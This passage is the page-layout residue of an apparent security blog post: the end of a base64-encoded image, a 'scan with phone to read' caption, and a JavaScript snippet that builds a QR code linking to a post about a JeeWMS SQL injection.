ca1eZjrRs+41v8I9euRd+z5zrtfDjkrBNV7PSTf9e43X3gaiOYbf+YGtgOpaVX0Y0Gmrl6eCrkI8UFQXayaih2H1MEarYPPvJoInzlA+eN32Lj3kdgsgKfeY1levSvkkHq5CNHhE7cDsejG772B0zv1vn1NugIyxVpXdJ+8cqswD+lzxXsP/eryEWHurVfUC7NPvaN1O4T0gTXaz3q5qD7i/Qrxdl4ET+/U+7kg03eKEK4PZq7eEeKzj3k5zHkI1yfCWq+8vWpdAbPXvAjJdw7Rq0cFzLy0CutqXSHvCKlXh/Cq6XG/QvqN/DA/fod4jqspmhetEyHTh6C6fph1mLl+EZK3vuvyFVoD6QHB7oXo+sWdTx3mOgiHoD77waxDOHzi/Qrx1l4ETwOBTKufD6LDjN3n0yBC/N0H0fWZh+jynu9cXyGkFoKlVVgjljaGOsx1MPOxZlzD7LOfHpjz6qL+wtNANN34MzdwGkhN6Znox4X5KYBwe3V/1+UdIX2u6nt+xWHu5V4w671WnzrM/p6/8ukX9ReeBlLiHT93A08PBPJUQPDZI0P8ELQOHnN9PkUQPwR7Xt+IeiA15tTFnW4eUi8Xr+r0iZA+MKP5wqcHUuY7/v8bOA0E1tPzaejYjwip73qvk0P8nVsPyctFWOvmR7T3qI1reNzL+o5jj1qbr3WFXCytonPI/sD932W9vdjX8VlWP1efonn4nCagvP07BvsAH3+nYAGE97xcn7jTIX1gj/YQIV75Dt/f13//D3M9hMNj7PusvqfTj6xedPPvvYHjsyynJe6OYV7sPnWx5yFPkXmYefd3n3n1FXYPZA8Imofw3gOiQ1C/qB/mvHpH60SY69QL71dI3cILxfE7BDI1eA779wCp67q8PzUw+2Hm1onWy0VIHaB0wl3tyfhLeNa/8wHT78tfbQ+wDs6++xVyXNNrLI6BOLUr7MfufsjUYUbrILp16nJIXl2EtW5dod6OkNryrEI/xAfBrsuv0D2ufKv8MZBV8ta+/wZOA4E8HTDj1dEg/u7rT4sc4u/cekgeguoiRIczds+Oq4ueRdzpkD3NixAdZjT/DJ4G8kzR7fn/buCPBwJ5GvoRfcpgndcPc946UZ+oLqoXqnWsXIU6ZE9YY3krdv6uy8WqrdjxylX0fGl/PJBqcsffu4G/PpDV1FfH3flgfmr1ifaC+OQjwj43+npPOazrzY89ag3xQ7C0Cph5aauwb+FfH8hqw1t7/gZOA6kprWLXUu/v5iFPj/Vi7wPxqcPMrSvUI0K8lauA8Gfz+qq2Qg7pU9ozYZ0IqZePeBrImLzX338Dx0AgU4PH+OwRYe7zbN3uiYP063mIDhxb6FEAPj5b6rp5sechdTCjfhGSl3e0L8w+CIdPPAbSm9z8Z27gHsjP3Pt2138BAAD//0CSbZgAAAAGSURBVAMAL4jsswG2wOgAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/JeeWMS-cgAutoListController-sort-order-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 